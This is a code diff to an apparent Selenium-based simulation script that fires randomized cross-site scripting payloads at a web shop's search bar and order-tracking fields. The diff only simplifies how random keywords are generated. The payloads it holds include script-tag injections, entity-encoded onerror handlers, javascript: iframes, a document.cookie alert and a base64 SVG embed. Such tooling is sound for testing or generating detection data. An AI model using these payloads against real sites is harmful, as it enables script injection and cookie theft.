@@ -29,8 +29,6 @@ HONG_KONG_ADDR = {
     "New Territories":["Islands", "Kwai Tsing", "North", "Sai Kung", "Sha Tin", "Tai Po", "Tsuen Wan", "Tuen Mun", "Yuen Long"]
 }
 
-ENGLISH_CHAR = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
-
 """
 with open('accounts.json') as f:
     accounts = json.load(f)
@@ -566,9 +564,7 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
     attackType = random.randint(0, 8)
     attackKeyWordLength = random.randint(1, 15)
     if attackType == 0:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
     elif attackType == 1:
         attackKeyWord = []
@@ -581,31 +577,21 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
             attackKeyWord.append(str(random.randint(65, 122)))
         attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
     elif attackType == 3:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
     elif attackType == 4:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
     elif attackType == 5:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
     elif attackType == 6:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
     elif attackType == 7:
         attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
     elif attackType == 8:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
         base64decodeString = base64.b64encode(base64String)
         attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
@@ -673,9 +659,7 @@ def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
     attackKeyWordLength = random.randint(1, 15)
     
     if attackType == 0:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
     elif attackType == 1:
         attackKeyWord = []
@@ -688,31 +672,21 @@ def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
             attackKeyWord.append(str(random.randint(65, 122)))
         attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
     elif attackType == 3:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
     elif attackType == 4:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
     elif attackType == 5:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
     elif attackType == 6:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
     elif attackType == 7:
         attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
     elif attackType == 8:
-        attackKeyWord = ""
-        for i in range(attackKeyWordLength):
-            attackKeyWord = attackKeyWord + ENGLISH_CHAR[random.randint(0, len(ENGLISH_CHAR)-1)]
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
         base64decodeString = base64.b64encode(base64String)
         attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
